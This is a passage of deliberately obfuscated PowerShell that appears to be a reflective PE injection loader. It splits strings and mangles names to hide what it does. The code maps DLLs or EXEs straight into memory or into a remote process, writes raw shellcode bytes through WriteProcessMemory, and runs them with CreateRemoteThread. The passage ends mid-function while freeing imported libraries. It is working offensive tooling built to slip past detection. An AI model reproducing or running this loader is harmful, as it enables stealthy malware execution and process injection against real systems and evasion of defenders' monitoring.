			&("{2}{1}{0}" -f'ning','e-War','Writ') ("{5}{8}{4}{0}{6}{7}{11}{1}{2}{13}{9}{12}{10}{3}"-f'not c','ble ','with','ause issues','is ','PE','om','p',' ','i','ht c','ati','g',' DEP, m') -WarningAction ("{1}{0}{2}"-f 'nti','Co','nue')
			${NXc`oMPati`B`Le} = ${F`AlSE}
		}
		
		
		
		${Pro`cesS`6`4b`iT} = ${TR`Ue}
		if (${REmOt`el`Oad`Ing} -eq ${t`Rue})
		{
			${K`er`NEl`32Ha`NdLe} = ${WIn`32F`UNCtI`ONs}."GeTmO`DUl`EH`An`Dle"."iN`Vo`Ke"(("{0}{1}{2}" -f 'kerne','l32','.dll'))
			${resu`LT} = ${w`IN32`FU`NctioNs}."gETp`RoCAd`drE`ss"."in`V`oke"(${KeRNEl`3`2H`AndLe}, ("{0}{3}{2}{4}{1}" -f'I','cess','ow64Pr','sW','o'))
			if (${re`SulT} -eq   ( GEt-VarIabLe  8zh  ).vAlue::"Z`ERO")
			{
				Throw ((("{10}{8}{11}{1}{15}{6}{13}{3}{16}{7}{4}{17}{5}{2}{12}{9}{14}{0}"-f 's 32bit or 64bit','t locat','arg','ces','tion t','mine if t',' IsWo','unc','nZe',' proces','Could','H','et','w64Pro','s i','e','s f','o deter'))  -crePLaCE ([CHaR]90+[CHaR]101+[CHaR]72),[CHaR]39)
			}
			
			[Bool]${wO`w6`4prO`CeSS} = ${fa`LSE}
			${s`UC`cEsS} = ${WI`N3`2Fu`Nc`TIONs}."I`sWOW64P`RoCE`sS"."I`NVokE"(${rEM`oTeP`R`oC`ha`NdlE}, [Ref]${WOW`64`p`ROCess})
			if (${s`UCC`ESs} -eq ${fa`LSE})
			{
				Throw ("{6}{5}{0}{1}{2}{3}{4}" -f 'ocess',' fa','i','le','d','4Pr','Call to IsWow6')
			}
			
			if ((${wOw6`4`P`RoCEsS} -eq ${T`RuE}) -or ((${wO`w64`p`ROCeSs} -eq ${fa`lSe}) -and (  ( Ls vArIAblE:LiSm5t ).vALuE::"SI`zeof"([Type][IntPtr]) -eq 4)))
			{
				${prO`cESs6`4biT} = ${FAl`se}
			}
			
			
			${P`owerShel`L64`B`IT} = ${tR`UE}
			if (  ${LIS`M`5t}::"sI`ZEOF"([Type][IntPtr]) -ne 8)
			{
				${po`Wer`sHEl`L64B`iT} = ${fa`lse}
			}
			if (${Po`W`ErsH`ElL64bit} -ne ${PR`Oce`sS6`4BIt})
			{
				throw ("{17}{1}{15}{0}{2}{4}{7}{13}{21}{12}{16}{10}{9}{20}{11}{5}{19}{3}{18}{6}{14}{8}" -f' same arch','owerShell mus','itect','emo','ur','and','o','e (','ess',' l','eing','aded ','E ','x86/x64) ','c','t be','b','P','te pr',' r','o','as P')
			}
		}
		else
		{
			if ( ${l`IsM5t}::"S`IZ`eoF"([Type][IntPtr]) -ne 8)
			{
				${P`Roces`S6`4bIT} = ${f`AlSe}
			}
		}
		if (${pROceSS6`4`BiT} -ne ${pe`InFo}."pE6`4`BIt")
		{
			Throw ((("{13}{9}{8}{1}{11}{24}{2}{22}{19}{17}{16}{3}{0}{21}{12}{14}{20}{23}{4}{18}{5}{6}{15}{7}{10}" -f'c','rm do','c','he pro','g l','3','2/','b','platfo',' ','it)','e','s','PE','s it is ','64','t',' ','oaded in (','ture of','bei','e','hitec','n','sn1Hft match the ar'))-CrEpLACe'1Hf',[chaR]39)
		}
		

		
		&("{2}{3}{4}{1}{0}"-f'Verbose','-','Wr','i','te') ("{7}{3}{4}{14}{15}{10}{0}{9}{6}{13}{11}{5}{1}{8}{16}{2}{12}" -f'P',' ','e','ca','tin','e its headers','a','Allo','to','E ','e ','rit','mory','nd w','g me','mory for th',' m')
		
        
		[IntPtr]${lo`AD`Addr} =   ( vArIAbLe  8zH -vaLueoNL)::"Z`erO"
        ${P`E`SuPPORTS`A`slR} = (${pe`i`NfO}."dLlCHa`RaCTE`RI`sTI`cS" -band ${w`iN32cOnSTa`Nts}."imAgE_dL`LChAra`Ct`er`I`SticS_DYNAMiC_`B`AsE") -eq ${w`I`N32`cONsTAN`TS}."imaGE`_DLl`CH`A`R`A`cteRIsT`ICs_dyNamiC_BA`se"
		if ((-not ${fO`Rce`ASLr}) -and (-not ${P`EsU`pPOr`TSAsLr}))
		{
			&("{0}{3}{2}{1}" -f 'W','arning','-W','rite') ("{37}{25}{1}{41}{43}{47}{23}{32}{4}{28}{7}{16}{11}{5}{36}{29}{27}{48}{44}{35}{40}{20}{9}{13}{2}{42}{14}{22}{46}{39}{31}{18}{26}{3}{24}{15}{34}{6}{8}{10}{45}{12}{30}{33}{19}{17}{0}{38}{21}"-f'ra','i','t','in OR try usin','ively loaded is ','p','ceAS',' A','LR ',',','flag (','LR com','ould',' ','re','the -','S','c',' ag','ause ','ils',')','starting Pow','g ref','g ','f','a',' If ','not','e.',' ','ing','lect','c','For','ad','atibl','PE ','shes','rShell and try','ing fa','le','ry ',' ','e lo','c','e','bein','th') -WarningAction ("{0}{2}{1}"-f 'Con','ue','tin')
			[IntPtr]${lo`AdADDr} = ${oRI`GI`NaL`im`AGEbAsE}
		}
        elseif (${fOr`CE`Aslr} -and (-not ${pe`SU`ppO`RTsa`sLR}))
        {
            &("{0}{2}{1}"-f'Writ','-Verbose','e') ((("{17}{7}{15}{25}{16}{18}{9}{22}{24}{10}{20}{3}{8}{4}{1}{14}{13}{6}{21}{5}{23}{0}{19}{2}{11}{12}"-f 'This could resu','cing ','t ','R is set','or','il','t','f','. F','t ','orce','in',' a crash.','R on ','ASL','ile','sn','PE ','LtI','l','ASL','he PE f','support ','e. ','ASLR but -F',' doe'))."RepL`AcE"('LtI',[sTring][CHAR]39))
        }

        if (${FoRCE`A`Slr} -and ${ReMo`T`eLO`AdiNG})
        {
            &("{1}{2}{3}{0}"-f 'r','Write-','Err','o') ("{8}{0}{4}{3}{10}{9}{6}{1}{7}{11}{5}{2}" -f 'us','d','e process.',' ','e ForceASLR','ot','a','ing in to a r','Cannot ',' lo','when','em') -ErrorAction ("{0}{1}" -f'S','top')
        }
        if (${rEMoT`ELOaDI`Ng} -and (-not ${PeSUPpOr`T`sAs`LR}))
        {
            &("{2}{1}{0}{3}" -f'ro','r','Write-E','r') ((("{10}{15}{4}{11}{7}{6}{9}{13}{8}{14}{0}{16}{3}{12}{5}{1}{2}"-f 'd a','t','o a remote process','SL','e',' ','t support AS','0}','a','L','P','sn{','R PE in','R. C','nnot loa','E do',' non-A'))-F  [cHar]39) -ErrorAction ("{0}{1}"-f'Sto','p')
        }

		${peHaN`D`Le} =   ${8`zh}::"zE`Ro"				
		${Effe`CtiveP`EhaN`dle} =  ( DIR ('va'+'RI'+'aBlE:8z'+'h')).VaLue::"Ze`Ro"		
		if (${REmote`lO`Adi`Ng} -eq ${T`Rue})
		{
			
			${peH`An`dLE} = ${wIN3`2`FUNc`TIo`NS}."v`irTuaLaLL`OC"."iN`Vo`Ke"(  ${8`ZH}::"ze`Ro", [UIntPtr]${PeI`N`FO}."S`i`zEo`FimagE", ${WIN32CON`S`T`ANTs}."MeM`_cOm`mit" -bor ${wIn3`2Con`s`Ta`NTs}."mEM_R`Es`e`Rve", ${W`In3`2CONS`TAn`Ts}."pag`e`_RE`Adwri`Te")
			
			
			${EfFE`cT`IVE`Pehand`Le} = ${wi`N32`FuncTIO`Ns}."VI`RtuAL`AlLoCex"."iNV`oKe"(${rEMotEP`ROcH`A`Nd`le}, ${l`O`ADaddR}, [UIntPtr]${pE`iNFo}."Si`zeoFiM`AGE", ${W`in32C`on`stan`TS}."meM_CO`m`miT" -bor ${WI`N32`cO`Ns`TAnTS}."M`em`_res`ERVe", ${wI`N32Co`NS`T`AnTS}."p`AGE`_E`xECutE`_ReaDWrITe")
			if (${eFf`ectIvE`pehA`Nd`Le} -eq   ( gEt-VaRiabLE  ("8"+"ZH") -ValU  )::"Z`eRO")
			{
				Throw ((("{25}{4}{35}{10}{7}{8}{21}{12}{1}{3}{6}{29}{13}{32}{28}{36}{22}{20}{15}{23}{24}{2}{30}{26}{0}{19}{16}{33}{14}{34}{27}{9}{17}{31}{5}{18}{11}"-f 'e reque','th','uld be tha','e rem','l',' is al','ote p','ate mem','ory',' of ','c','dy in use',' ','ss. ',' a','support ASLR, i','ed ba','th','rea','st','}t ',' in','aded doesn{0','t ','co','Unable to al','th','s','g l','roce','t ','e PE','If the PE bein','se','ddres','o','o')) -F [cHAr]39)
			}
		}
		else
		{
			if (${NXCo`m`P`AtIBlE} -eq ${T`Rue})
			{
				${pEh`ANd`Le} = ${WIN3`2fUnc`TIo`Ns}."VirT`U`AlAL`LOC"."in`VokE"(${loa`D`ADdr}, [UIntPtr]${pE`inFo}."sI`zE`OFima`ge", ${wi`N32c`OnSt`ANTs}."mEm_`cO`MmiT" -bor ${WIN`32con`s`Ta`NtS}."MEM`_REser`Ve", ${w`I`N32COnS`TAnts}."Page_ReA`D`W`RiTE")
			}
			else
			{
				${P`EHANd`le} = ${w`IN32`FUnct`iOns}."v`Ir`TuaLaLl`oC"."inv`okE"(${LoA`d`AdDr}, [UIntPtr]${PeIn`Fo}."S`ize`OFI`maGe", ${w`in3`2c`onSt`AnTS}."Mem`_C`OMM`It" -bor ${WI`N32cONSta`NTS}."M`em`_`ReserVe", ${Win32cOnS`TA`NTS}."pAG`E_Ex`ecUT`E`_reAD`wRi`Te")
			}
			${E`FFEct`iVEp`EHA`NDLE} = ${p`eh`ANdLe}
		}
		
		[IntPtr]${pEeN`daDd`Ress} = &("{5}{6}{3}{1}{4}{0}{2}" -f'ig','AsU','ned','t','ns','Add-S','ignedIn') (${pEhaN`D`le}) ([Int64]${PEI`Nfo}."s`IzEO`Fim`AgE")
		if (${P`EHa`Nd`Le} -eq   (GEt-VArIaBLE  ('8'+'ZH')).vALUE::"Ze`RO")
		{ 
			Throw ("{19}{44}{14}{18}{5}{2}{29}{43}{35}{7}{46}{13}{26}{34}{38}{12}{49}{1}{32}{37}{20}{3}{31}{16}{42}{23}{17}{48}{10}{33}{22}{45}{15}{30}{4}{40}{6}{8}{36}{25}{21}{27}{24}{39}{41}{28}{47}{9}{11}{0}{50}" -f' be','e,','cate mem','ning the ','l','lo','iff','r ','erent m','e PE ','t','wants might','R compat','. If ','fa','ll process ','n a ne','Shell pro','iled to al','Virtual','un','you','e new ','Power','o t','ry la','PE','t, s','s t','ory','wi','script i',' try','h',' ','o','emo',' r','is not ASL','he','l have a d',' addres','w ',' f','Alloc ','PowerShe','PE','h','cess (','ibl',' free).')
		}		
		  ${lI`s`M5t}::("{0}{1}" -f'Cop','y').Invoke(${P`Eb`yTes}, 0, ${pE`H`AndLe}, ${P`E`InFO}."siZeOfhe`AdE`Rs") | &("{0}{2}{1}" -f'O','l','ut-Nul')
		
		
		
		&("{3}{0}{2}{1}"-f 't','erbose','e-V','Wri') ("{11}{10}{0}{7}{8}{5}{6}{13}{9}{14}{12}{4}{3}{1}{15}{2}" -f'f','loaded in m','ory','headers ',' ','ti','o','or','ma','ro','ting detailed PE in','Get',' the','n f','m','em')
		${Pei`N`Fo} = &("{3}{1}{2}{0}{4}" -f'i','e','t-PEDeta','G','ledInfo') -PEHandle ${P`EHANd`lE} -Win32Types ${WiN`32TYp`eS} -Win32Constants ${WIn3`2CO`NS`TA`NTS}
		${Pe`i`NFO} | &("{1}{2}{0}"-f 'er','Add','-Memb') -MemberType ("{0}{1}{2}"-f 'N','otePropert','y') -Name ("{1}{2}{0}" -f'dress','EndA','d') -Value ${pe`enDad`dr`e`sS}
		${peI`NFo} | &("{1}{2}{0}"-f 'mber','Add-','Me') -MemberType ("{2}{0}{1}{3}"-f't','eP','No','roperty') -Name ("{0}{3}{2}{1}"-f 'E','ePEHandle','fectiv','f') -Value ${eFF`E`Ctive`pehaNDlE}
		&("{2}{1}{0}" -f'se','-Verbo','Write') "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress) "
		
		
		
		&("{3}{0}{2}{1}" -f'ri','e','te-Verbos','W') ("{1}{0}{4}{2}{3}"-f 'opy','C',' ','sections in to memory',' PE')
		&("{0}{1}{4}{2}{3}"-f 'Cop','y','i','ons','-Sect') -PEBytes ${PEb`Y`TES} -PEInfo ${p`Ei`Nfo} -Win32Functions ${WIN`32f`UnC`Ti`ONs} -Win32Types ${wIn32T`yP`es}
		
		
		
		&("{1}{3}{2}{0}"-f'ose','Write-','b','Ver') ("{16}{12}{14}{6}{4}{3}{1}{13}{15}{5}{8}{2}{11}{7}{0}{9}{10}" -f 'y loaded',' t','ct',' where',' on',' was',' based','ll',' a',' in',' memory','ua','ory address','he P','es','E','Update mem')
		&("{1}{3}{4}{0}{2}" -f 'Mem','Up','oryAddresses','dat','e-') -PEInfo ${PE`iNfo} -OriginalImageBase ${o`RiGin`AlImAGe`BASe} -Win32Constants ${W`In32`CONStANTs} -Win32Types ${WI`N`3`2TYpes}

		
		
		&("{2}{1}{3}{4}{0}"-f 'se','Ver','Write-','b','o') ((("{10}{8}{11}{4}{1}{2}{7}{0}{5}{6}{3}{9}{12}" -f 'we','th','e',' load','needed by ',' ar','e',' PE ','rt D','in','Impo','LLw7cs ','g'))  -CReplacE([Char]119+[Char]55+[Char]99),[Char]39)
		if (${rE`Mo`TeLOAdi`Ng} -eq ${T`RuE})
		{
			&("{1}{3}{2}{4}{0}" -f 's','Impo','o','rt-DllImp','rt') -PEInfo ${p`E`iNfO} -Win32Functions ${wIn`3`2fun`cTioNS} -Win32Types ${wIN32`T`y`PEs} -Win32Constants ${wi`N32`Con`sTANTs} -RemoteProcHandle ${Rem`OtE`PrO`cha`NdlE}
		}
		else
		{
			&("{1}{4}{2}{3}{0}"-f'orts','Impo','t-DllIm','p','r') -PEInfo ${p`eiN`Fo} -Win32Functions ${wi`N`32`F`UNctIONs} -Win32Types ${W`IN3`2T`ypEs} -Win32Constants ${W`in32CoN`StaN`Ts}
		}
		
		
		
		if (${re`MOTEl`O`AdING} -eq ${f`A`LSE})
		{
			if (${nX`COMP`AtIbLe} -eq ${TR`Ue})
			{
				&("{1}{3}{2}{0}"-f'e','Writ','bos','e-Ver') ("{6}{1}{0}{9}{3}{4}{5}{8}{7}{2}"-f 'e memo','pdat','gs','y',' ','prot','U',' fla','ection','r')
				&("{0}{2}{6}{7}{3}{5}{4}{1}{8}"-f'U','tection','p','em','yPro','or','date','-M','Flags') -PEInfo ${Pei`NFo} -Win32Functions ${WIn32`FU`N`cTIOns} -Win32Constants ${Win32`cOnS`TA`N`TS} -Win32Types ${W`In32`TYpeS}
			}
			else
			{
				&("{2}{0}{3}{1}" -f'V','e','Write-','erbos') ("{3}{15}{21}{9}{16}{23}{8}{0}{6}{20}{11}{4}{2}{18}{12}{7}{5}{25}{29}{28}{14}{1}{13}{24}{17}{22}{26}{19}{27}{10}"-f 'lo',' memory','not compati','PE ',' ','m','ade','h NX ',' ','flec','ute',' is','t',' as','g','bein','ti','r','ble wi','te','d','g re','ead','vely',' ','emory, k',' wri',' exec','pin','ee')
			}
		}
		else
		{
			&("{2}{0}{3}{1}" -f 't','ose','Wri','e-Verb') ("{0}{18}{13}{15}{2}{7}{11}{3}{8}{6}{14}{12}{10}{9}{5}{17}{4}{16}{1}"-f'P','ssions','ng lo','d in t','mory p','cess, not adjusting m','a ','a','o ','ro',' p','de','e','b','remot','ei','ermi','e','E ')
		}
		
		
		
		if (${REm`OTel`oADI`Ng} -eq ${TR`UE})
		{
			[UInt32]${N`U`MByTe`SWRiT`TeN} = 0
			${S`UCce`ss} = ${win32fUNc`T`iO`NS}."wr`Ite`PR`ocEssMEmo`RY"."InV`oKE"(${remOT`eP`ROCha`Nd`le}, ${eff`eCTIv`E`PeHANDLE}, ${P`EH`ANDLe}, [UIntPtr](${pe`infO}."sizeo`FI`m`Age"), [Ref]${nU`mBy`TE`swrittEn})
			if (${s`UCCesS} -eq ${F`AL`Se})
			{
				Throw ("{2}{6}{9}{8}{0}{7}{5}{10}{3}{1}{4}" -f'e ','mo','Unable to writ','te process me','ry.','o rem','e','t','cod',' shell','o')
			}
		}
		
		
		
		if (${Pe`In`FO}."f`Ilet`yPE" -ieq "DLL")
		{
			if (${rEMO`TELOadi`NG} -eq ${fA`L`se})
			{
				&("{2}{1}{3}{4}{0}" -f 'ose','rite-V','W','e','rb') ("{4}{8}{5}{2}{7}{3}{6}{1}{0}"-f 'oaded','een l','L knows ','t has ','Calling dllmain','L','b','i',' so the D')
				${DlLM`Ai`Np`Tr} = &("{4}{0}{2}{1}{3}" -f'dd-Sig','edIntAsUnsigne','n','d','A') (${PE`InFO}."P`EHa`NdLe") (${p`E`INfO}."I`MAG`e_Nt_`h`eAdeRs"."o`P`Ti`onAlhEADer"."A`ddREsS`Ofent`RYpOInt")
				${D`llm`AinD`El`EG`AtE} = &("{4}{3}{2}{1}{0}" -f 'pe','y','eT','elegat','Get-D') @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				${D`L`LMAIN} =   (variaBlE  ('LIsM5'+'T') ).vaLUE::("{4}{6}{1}{5}{3}{0}{8}{2}{7}"-f 'Functio','gate','nte','or','Ge','F','tDele','r','nPoi').Invoke(${dLLm`AI`NptR}, ${dLlMai`N`dELeGa`TE})
				
				${Dl`lMa`In}."I`Nv`oke"(${pe`I`NfO}."PEha`NDLe", 1,  ${8`zH}::"zE`Ro") | &("{1}{0}"-f 't-Null','Ou')
			}
			else
			{
				${DlL`main`ptR} = &("{0}{2}{1}{3}" -f'Add','ed','-Sign','IntAsUnsigned') (${Ef`FE`CT`I`VePEH`AnDle}) (${p`EINFo}."i`MAGE_Nt_h`EAD`e`Rs"."optiO`Nal`HEadER"."a`DD`REss`OFENTRy`POInt")
			
				if (${PeI`NFO}."pE6`4BIT" -eq ${T`RuE})
				{
					
					${cAL`lD`L`lMAins`c1} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					${cALlDlL`maI`N`SC2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					${CALLdllMAIN`s`C3} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					
					${CAlL`d`LLmAI`NS`C1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					${caL`L`D`lLmAins`C2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					${cA`LLdllMa`i`Ns`C3} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				${sClEng`TH} = ${cA`LLdlL`m`AIn`SC1}."leN`GTH" + ${Ca`L`LDlL`mAInSC2}."lEng`TH" + ${c`ALl`dLL`Mai`NSC3}."LE`NgtH" + (${pTrS`I`ze} * 2)
				${s`cPs`MeM} =  ${LiS`M5t}::("{0}{2}{1}" -f'AllocHG','al','lob').Invoke(${SC`LeN`Gth})
				${ScPs`memO`R`iGi`Nal} = ${S`CpSmem}
				
				&("{2}{1}{4}{0}{3}" -f 'emor','yte','Write-B','y','sToM') -Bytes ${c`ALl`DLl`mAinSc1} -MemoryAddress ${s`Cps`mEm}
				${S`CP`SMeM} = &("{2}{4}{3}{5}{0}{1}"-f 'nedIntAsUnsig','ned','Ad','i','d-S','g') ${sC`PSm`eM} (${c`ALld`Llm`AI`Nsc1}."Le`NgTH")
				  (gEt-vARiABLE ('lIsM5'+'T')  ).VALUe::("{1}{3}{0}{2}"-f'ure','St','ToPtr','ruct').Invoke(${EfF`eCti`V`EPEHA`NdLe}, ${scPs`M`EM}, ${f`Al`SE})
				${s`CPS`mem} = &("{4}{2}{1}{3}{5}{0}" -f'ed','gnedIntAsU','d-Si','ns','Ad','ign') ${s`c`pSMEM} (${pt`Rs`IZE})
				&("{3}{1}{5}{2}{4}{0}"-f 'y','-Byt','oMemo','Write','r','esT') -Bytes ${CALLDLLm`A`i`NsC2} -MemoryAddress ${S`cpSm`em}
				${ScPS`Mem} = &("{2}{3}{0}{5}{4}{1}" -f 's','gned','Add-SignedInt','A','si','Un') ${s`CpSm`em} (${Ca`LLdl`L`mAinsc2}."l`EnGTh")
				  (gEt-VARiAble ("l"+"Ism5"+"t") -vA)::("{1}{2}{0}"-f 'uctureToPtr','St','r').Invoke(${D`llmai`Np`Tr}, ${S`CpsmEM}, ${fA`lSE})
				${S`Cp`smem} = &("{0}{3}{6}{4}{1}{5}{2}" -f'Add-','Uns','ned','Sig','As','ig','nedInt') ${sc`PsM`em} (${P`TR`size})
				&("{4}{2}{5}{1}{3}{0}" -f'ry','es','te-B','ToMemo','Wri','yt') -Bytes ${cALlDlL`Ma`INSC3} -MemoryAddress ${Sc`PsM`Em}
				${s`cPS`Mem} = &("{1}{2}{0}{3}{4}{5}"-f'ign','Ad','d-S','e','dIntAsUnsign','ed') ${s`CPSmEM} (${cAlLdL`lm`AiN`S`C3}."L`en`gtH")
				
				${r`s`Caddr} = ${w`i`N32`FUN`cTIoNS}."ViRT`UaLAL`lO`cex"."iN`Vo`Ke"(${r`Emo`T`EproCHaND`le},   (VAriabLE 8Zh ).valuE::"z`eRO", [UIntPtr][UInt64]${scL`En`GtH}, ${wIN32c`On`stA`NTs}."mem`_cO`MmIt" -bor ${WIN3`2`conS`T`ANTS}."MEM_r`Ese`RVe", ${wi`N3`2c`onstaNts}."PAGe_`ex`ECUte`_ReaDW`RiTE")
				if (${R`scA`ddr} -eq   ( Get-vARiABlE ("8"+"ZH") -VaLuEoNLY  )::"Z`eRO")
				{
					Throw ("{10}{5}{2}{14}{15}{1}{3}{6}{11}{9}{13}{12}{4}{0}{8}{7}"-f 's f',' ','able to a','memo','es','n','r','ode','or shellc','in the remo','U','y ','c','te pro','l','locate')
				}
				
				${SU`CcEss} = ${W`iN32FUnC`T`ioNs}."Wr`it`eproCESsmemO`Ry"."I`NVOKe"(${RE`mOte`pR`o`C`HANDLE}, ${RSc`A`Ddr}, ${SC`psme`mORi`gINaL}, [UIntPtr][UInt64]${scLen`G`TH}, [Ref]${NUmbyT`ES`WrItT`EN})
				if ((${sUCc`eSS} -eq ${F`Alse}) -or ([UInt64]${Nu`MByt`E`sWRiTtEn} -ne [UInt64]${SC`LEN`G`TH}))
				{
					Throw ("{5}{8}{4}{2}{1}{9}{0}{6}{7}{3}" -f 'o','remote ','rite shellcode to ','.',' w','Unable t','r','y','o','process mem')
				}

				${Rt`H`REaDhAnD`Le} = &("{1}{0}{4}{2}{5}{3}" -f'eate-Remo','Cr','eThr','d','t','ea') -ProcessHandle ${RE`m`otE`prOCHA`NdlE} -StartAddress ${r`s`CaDDR} -Win32Functions ${wI`N32fUn`C`TIo`Ns}
				${Res`ULT} = ${WIn32`Fu`N`CTiONS}."w`AIT`FO`Rsing`Leo`BjECT"."invO`Ke"(${R`T`hr`EADhANDlE}, 20000)
				if (${R`esu`LT} -ne 0)
				{
					Throw ("{9}{8}{1}{6}{5}{4}{2}{0}{7}{3}" -f 'ddress f','o Crea','A','led.','ll GetProc','to ca','teRemoteThread ','ai','t','Call ')
				}
				
				${win32fu`NC`TI`onS}."v`IRtU`ALFR`eEeX"."in`Vo`Ke"(${RE`MOteproc`hanD`le}, ${rS`CADdr}, [UIntPtr][UInt64]0, ${wIn32c`OnS`TAN`TS}."M`em_`RElEASE") | &("{0}{2}{1}" -f 'O','ull','ut-N')
			}
		}
		elseif (${P`e`Info}."f`iLet`ypE" -ieq "EXE")
		{
			
			[IntPtr]${E`x`EDoneBytE`P`Tr} =  ${l`is`m5T}::("{2}{1}{0}"-f 'lobal','locHG','Al').Invoke(1)
			 (Item  ("vAR"+"iA"+"blE:liSm"+"5t") ).VALuE::("{1}{2}{0}"-f'eByte','Wri','t').Invoke(${exEdONe`B`Yte`PTR}, 0, 0x00)
			${OveRw`R`IT`Ten`memI`Nfo} = &("{4}{2}{3}{1}{0}"-f 'ctions','xeFun','p','date-E','U') -PEInfo ${PeiN`FO} -Win32Functions ${Win`32FUNcT`i`OnS} -Win32Constants ${W`in`32c`oNS`TaNtS} -ExeArguments ${Ex`e`ArGS} -ExeDoneBytePtr ${E`X`E`DoNebytEPtr}

			
			
			[IntPtr]${EXEmA`inp`Tr} = &("{5}{1}{2}{4}{6}{3}{0}"-f'signed','d-S','i','sUn','gnedIn','Ad','tA') (${PEI`NFO}."pE`hANd`le") (${pE`INfo}."ImA`gE`_nT_`He`AdErS"."OptiO`NA`lH`EADEr"."AdDRE`ssO`Fe`NTrYP`O`int")
			&("{0}{1}{2}"-f'Writ','e-Verbo','se') "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in. "

			${WiN32`F`UnCT`IoNs}."cRe`A`Tet`HREaD"."i`NVoKe"( ${8`ZH}::"ze`Ro",   ( varIablE ('8'+'zH') -VALUeoNLY  )::"Z`Ero", ${ex`E`MAINp`TR},   ${8`zh}::"ze`RO", ([UInt32]0), [Ref]([UInt32]0)) | &("{0}{1}"-f'Out-N','ull')

			while(${TR`UE})
			{
				[Byte]${t`hR`eadDOnE} =  (  item  ('vAr'+'I'+'ABLE:LiSm'+'5T') ).vaLUe::("{0}{1}{2}" -f 'Read','B','yte').Invoke(${eX`e`DoNebYte`P`TR}, 0)
				if (${thRE`A`d`dONe} -eq 1)
				{
					&("{3}{4}{0}{6}{2}{5}{1}" -f'y-Ar','sses','r','C','op','e','rayOfMemAdd') -CopyInfo ${Over`writTEnm`EmI`N`FO} -Win32Functions ${W`IN32FuN`cTI`o`NS} -Win32Constants ${WI`N32C`o`NstANtS}
					&("{0}{3}{2}{1}" -f'Wr','bose','te-Ver','i') ("{2}{3}{4}{0}{1}"-f 'as compl','eted.','EXE thr','ead',' h')
					break
				}
				else
				{
					&("{2}{0}{1}"-f '-Slee','p','Start') -Seconds 1
				}
			}
		}
		
		return @(${Pe`iNFo}."PEha`N`DlE", ${eF`F`eCtIV`EpEhaN`d`lE})
	}
	
	
	Function INv`O`KE-memo`Ryf`RE`eLI`BRA`Ry
	{
		Param(
		[Parameter(poSitION=0, MaNdatory=${tR`Ue})]
		[IntPtr]
		${pEhaN`DLe}
		)
		
		
		${wIn32COnS`Ta`NTs} = &("{3}{1}{0}{2}{4}"-f 'C','32','onstan','Get-Win','ts')
		${WIN`32fUNctI`o`NS} = &("{2}{3}{0}{1}"-f'in32Fun','ctions','Get-','W')
		${w`in`32TY`PES} = &("{0}{4}{3}{1}{2}"-f'G','2Typ','es','Win3','et-')
		
		${PEIn`FO} = &("{3}{1}{0}{2}" -f'led','tai','Info','Get-PEDe') -PEHandle ${peh`AND`le} -Win32Types ${W`i`N32`TyPeS} -Win32Constants ${WIn`32CO`NSTanTS}
		
		
		if (${pe`iNfO}."IMage`_NT_He`A`DErS"."OpTI`o`N`ALHea`DEr"."iMP`O`RTT`ABlE"."Si`Ze" -gt 0)
		{
			[IntPtr]${iMPOr`T`d`EsCr`ip`Tor`Ptr} = &("{1}{4}{3}{2}{0}" -f 'sUnsigned','A','tA','nedIn','dd-Sig') ([Int64]${PEIN`Fo}."peHand`LE") ([Int64]${Pe`InFO}."iMAgE_n`T_HE`ADerS"."opt`i`OnALH`eADeR"."IM`P`ORTTa`BlE"."v`Ir`T`UaLA`DDREss")
			
			while (${T`RuE})
			{
				${im`pOR`TdEsC`RipToR} =   ${lism`5T}::"PTRTo`St`RUcTure"(${imPo`RtDe`ScRipt`ORPTr}, [Type]${WIN32`TYp`ES}."IMaGE_`I`MpORt_d`E`S`cr`IpTor")
				
				
				if (${ImP`O`RtDeScRipt`OR}."cHArA`CT`eRiS`Tics" -eq 0 `
						-and ${IMP`OR`TDeScRip`TOr}."fI`RS`TTh`Unk" -eq 0 `
						-and ${im`p`ORt`DEscr`IpTOR}."FOrwa`RDe`R`ch`AiN" -eq 0 `
						-and ${iMPO`RtDEs`c`Ri`ptor}."n`AmE" -eq 0 `
						-and ${IM`pORT`DeS`c`RIptOR}."TIMe`d`AT`eSTaMP" -eq 0)
				{
					&("{1}{3}{0}{2}"-f 'Verbo','Wri','se','te-') ("{11}{0}{10}{12}{9}{1}{3}{8}{4}{5}{6}{7}{2}" -f'ne',' ','y the PE','the lib','arie','s n','ee','ded b','r','ng',' unload','Do','i')
					break
				}

				${Im`PORtD`l`LPAtH} =  ( get-ItEM ('vaR'+'iABLe:LisM5'+'T') ).vaLue::("{2}{3}{1}{0}"-f 'i','s','PtrToStr','ingAn').Invoke((&("{4}{1}{2}{3}{0}"-f'd','d-S','ignedIntAsUnsig','ne','Ad') ([Int64]${PeI`NFo}."Pe`hand`LE") ([Int64]${i`m`Po`RTdeSc`R`IPTor}."n`AME")))
				${im`pOrT`DLlHA`NDlE} = ${WiN3`2`FUn`CTiONS}."getmod`ULeHa`ND`lE"."in`V`oKe"(${i`Mpo`RtdL`LP`ATH})

				if (${IMPor`T`dl`LH`AndlE} -eq ${N`ULL})
				{
					&("{1}{2}{3}{0}"-f 'g','Write-','W','arnin') ('E'+'rror '+'gettin'+'g '+'DL'+'L '+'handl'+'e '+'i'+'n '+'Memory'+'Fr'+'eeLibr'+'ar'+'y'+', '+'DL'+'L'+'N'+'ame: '+"$ImportDllPath. "+'Con'+'tinuin'+'g '+'anyw'+'ays') -WarningAction ("{0}{1}"-f'Con','tinue')
				}
				
				${sUcc`E`sS} = ${w`in32Fu`NcTiOnS}."f`REELiB`R`ARy"."INvO`Ke"(${IMPOR`T`dl`LHANdLe})
				if (${s`UCCEsS} -eq ${fal`se})
				{
